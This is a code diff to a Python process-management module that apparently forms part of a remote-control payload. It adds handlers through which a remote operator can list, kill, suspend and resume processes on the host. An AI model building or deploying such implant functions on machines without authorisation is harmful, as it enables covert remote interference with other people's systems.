@@ -8,6 +8,7 @@ from lib.tool import EZData, Encoder
 #[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]
 
 import os
+import subprocess
 from dataclasses import dataclass
 
 class Process:
@@ -26,6 +27,13 @@ class Process:
         cmdline = ''
         utime = 0
         stime = 0
+
+    def run_command(self, command) -> bool:
+        try:
+            result = subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            return True
+        except subprocess.CalledProcessError:
+            return False
 
     def get_processes(self) -> list:
         def read_file(path: str):
@@ -66,10 +74,21 @@ class Process:
                 pass
 
         return lsProc
+    
+    def suspend_process(self, pid: int) -> bool:
+        command = ['kill', '-STOP', str(pid)]
+        return self.run_command(command)
+    
+    def resume_process(self, pid: int) -> bool:
+        command = ['kill', '-CONT', str(pid)]
+        return self.run_command(command)
+    
+    def kill_process(self, pid: int) -> bool:
+        command = ['kill', '-9', str(pid)]
+        return self.run_command(command)
 
     def run(self, clnt: object, szToken: str, lsMsg: list) -> list:
         try:
-            print('xxx')
             if lsMsg[0] == 'ls':
                 ls = []
                 for info in self.get_processes():
@@ -86,8 +105,6 @@ class Process:
                         str(info.stime),
                     ])
 
-                    print(ls)
-
                 return [
                     'proc',
                     'ls',
@@ -95,17 +112,28 @@ class Process:
                     EZData.twoDlist2str(ls),
                 ]
             elif lsMsg[0] == 'kill':
-                os.kill(int(lsMsg[1]))
-                
                 return [
                     'proc',
                     'kill',
-                    '1',
+                    '1' if self.kill_process(int(lsMsg[1])) else '0',
+                    lsMsg[1], # pid
+                ]
+            elif lsMsg[0] == 'suspend':
+                return [
+                    'proc',
+                    'suspend',
+                    '1' if self.suspend_process(int(lsMsg[1])) else '0',
+                    lsMsg[1],
+                ]
+            elif lsMsg[0] == 'resume':
+                return [
+                    'proc',
+                    'resume',
+                    '1' if self.resume_process(int(lsMsg[1])) else '0',
                     lsMsg[1],
                 ]
 
         except Exception as ex:
-            print(ex)
             return [
                 'proc',
                 lsMsg[0],
